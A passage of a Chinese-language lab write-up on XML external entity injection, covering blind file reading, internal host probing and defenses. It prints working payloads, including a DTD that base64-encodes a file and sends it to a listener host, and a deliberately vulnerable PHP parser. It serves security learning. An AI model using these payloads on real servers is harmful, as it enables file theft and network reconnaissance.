+<p>发现报错，所以要使用CDATA</p>
+<p>CDATA:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[内容]]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>而且要引用外部实体</p>
+<p><img src="/assets/image-20200512183847087.png" alt="image-20200512183847087"></p>
+<p>其中evil.dtd:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">evil</span> <span class="meta-string">"%start;%xxe;%end;"</span></span></span><br></pre></td></tr></table></figure>
+
+<p>注意这里逻辑是：</p>
+<p>（1）执行DTD中%data</p>
+<p>（2）%data执行获取远程dtd</p>
+<p>（3）执行&evil;</p>
+<p>（4）&amp;evil执行中执行%start;%xxe;%end;</p>
+<p>（5）执行CDATA获取远程文件。</p>
+<h2><span id="实验三-无回显的本地文件读取">实验三 无回显的本地文件读取。</span></h2><p>源码：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	libxml_disable_entity_loader(<span class="keyword">false</span>);</span></span><br><span class="line"><span class="php">	$xmlfile = file_get_contents(‘php:<span class="comment">//input’);</span></span></span><br><span class="line"><span class="php">	$dom = <span class="keyword">new</span> DOMDocument();</span></span><br><span class="line"><span class="php">	$dom-&gt;loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);</span></span><br><span class="line"><span class="php">	$creds = simplexml_import_dom($dom); </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>不同的就是没有echo响应数据。</p>
+<p>首先本地端口监听数据：</p>
+<p><img src="/assets/image-20200512185519178.png" alt="image-20200512185519178"></p>
+<p>请求包payload:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost/xml/evil2.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;send<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>evil2.dtd:</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read-convert.base64-encode/resource=http://localhost/xmltest2.txt"</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">dtd</span> <span class="meta-string">"&lt;!ENTITY send SYSTEM 'http://10.1.1.123:8888/?%xxe;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="perl">%dtd;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/assets/image-20200512191755026.png" alt="image-20200512191755026"></p>
+<p>base64解码后得到内容：</p>
+<p><img src="/assets/image-20200512191821789.png" alt="image-20200512191821789"></p>
+<h2><span id="实验四-利用xxe进行内网主机探测">实验四 利用XXE进行内网主机探测。</span></h2><p>利用先前有回显的XXE进行内网主机探测,探测原理是访问内网每个ip地址的80端口，观看response。</p>
+<p>如图所示，访问主机：</p>
+<p><img src="/assets/image-20200513095511671.png" alt="image-20200513095511671"></p>
+<p>所以直接用burp扫描即可。</p>
+<p><img src="/assets/image-20200513095810003.png" alt="image-20200513095810003"></p>
+<p>当响应有如下时即代表主机不存活。</p>
+<p><img src="/assets/image-20200513101256793.png" alt="image-20200513101256793"></p>
+<p>其他代表存活，一共有3台机器存活，</p>
+<p><img src="/assets/image-20200513101344183.png" alt="image-20200513101344183"></p>
+<p><img src="/assets/image-20200513101431798.png" alt="image-20200513101431798"></p>
+<p>防御方法：</p>
+<p>（1）过滤用户输入的html数据，以及一些关键词。</p>
+<p>（2）禁用外部实体：</p>
+<ul>
+<li><p>libxml_disable_entity_loader(true)<em>;</em> </p>
+</li>
+<li><p>DocumentBuilderFactorydbf =DocumentBuilderFactory.<strong>new**</strong>Instance**();</p>
+<p>dbf.setExpandEntityReferences(false);</p>
+</li>
+</ul>
+<p>参考：</p>
+<p> <a href="http://www.hetianlab.com/expc.do?ce=e84d7a28-357a-4a01-996c-31d2dd21a810" target="_blank" rel="noopener">http://www.hetianlab.com/expc.do?ce=e84d7a28-357a-4a01-996c-31d2dd21a810</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+      
+    </div>
+      
+  <div class="popular-posts-header">相关文章</div>
+  <ul class="popular-posts">
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\vulnhub-xxe\" rel="bookmark">vulnhub_xxe</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\SkyConCTF2016靶机测试\" rel="bookmark">SkyConCTF2016靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\pwnlab靶机测试\" rel="bookmark">pwnlab靶机测试</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\web\JS学习\" rel="bookmark">JS学习</a></div>
+    </li>
+    <li class="popular-posts-item">
+      <div class="popular-posts-title"><a href="\渗透测试\JIS-CTF靶机测试\" rel="bookmark">JIS-CTF靶机测试</a></div>
+    </li>
+  </ul>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/xxe/" rel="tag"><i class="fa fa-tag"></i>xxe</a>
+              <a href="/tags/web/" rel="tag"><i class="fa fa-tag"></i>web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/%E7%AE%97%E6%B3%95/%E6%B1%82%E6%95%B0%E7%BB%84%E8%BF%9E%E7%BB%AD%E6%9C%80%E5%A4%A7%E5%92%8C/" rel="prev" title="求数组连续最大和">
+      <i class="fa fa-chevron-left"></i> 求数组连续最大和
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/uncategorized/MyWebServer1%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="next" title="MyWebServer1靶机练习">
+      MyWebServer1靶机练习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-text">靶场实验</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">有回显XXE</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">无回显XXE</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-text">XML外部实体注入漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">实验一 DTD学习</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">实验二  有回显的本地文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">实验三 无回显的本地文件读取。</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-text">实验四 利用XXE进行内网主机探测。</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="gwolfs"
+      src="/images/head1.png">
+  <p class="site-author-name" itemprop="name">gwolfs</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/TataYdq" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TataYdq" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1937441951@qq.com" title="E-Mail → mailto:1937441951@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+<!-- CloudCalendar -->
+<div class="widget-wrap" style="width: 90%;margin-left: auto;margin-right: auto; opacity: 0.97;">
+	<div class="widget" id="CloudCalendar"></div>
+</div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="http://www.beian.miit.gov.cn/" rel="noopener" target="_blank">京ICP备19000724号-1 </a>
+      <img src="/images/beian.png" style="display: inline-block;"><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802028114" rel="noopener" target="_blank">京公网安备 11010802028114号 </a>
+  </div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">gwolfs</span>
+</div>
+
+
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共19k字</span>
+  <span class="post-meta-divider">|</span>
+  本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  <span class="post-meta-divider">|</span>
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  <span class="post-meta-divider">|</span>
+  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+document.querySelectorAll('.pdfobject-container').forEach(element => {
+  let url = element.dataset.target;
+  let pdfOpenParams = {
+    navpanes : 0,
+    toolbar  : 0,
+    statusbar: 0,
+    pagemode : 'thumbs',
+    view     : 'FitH'
+  };
+  let pdfOpenFragment = '#' + Object.entries(pdfOpenParams).map(([key, value]) => `${key}=${encodeURIComponent(value)}`).join('&');
+  let fullURL = `/lib/pdf/web/viewer.html?file=${encodeURIComponent(url)}${pdfOpenFragment}`;
+
+  if (NexT.utils.supportsPDFs()) {
+    element.innerHTML = `<embed class="pdfobject" src="${url + pdfOpenFragment}" type="application/pdf" style="height: ${element.dataset.height};">`;
+  } else {
+    element.innerHTML = `<iframe src="${fullURL}" style="height: ${element.dataset.height};" frameborder="0"></iframe>`;
+  }
+});
+</script>
+
+
+
+
+  
+
+  
+<!-- calendar widget -->
+
+
+</body>
+</html>
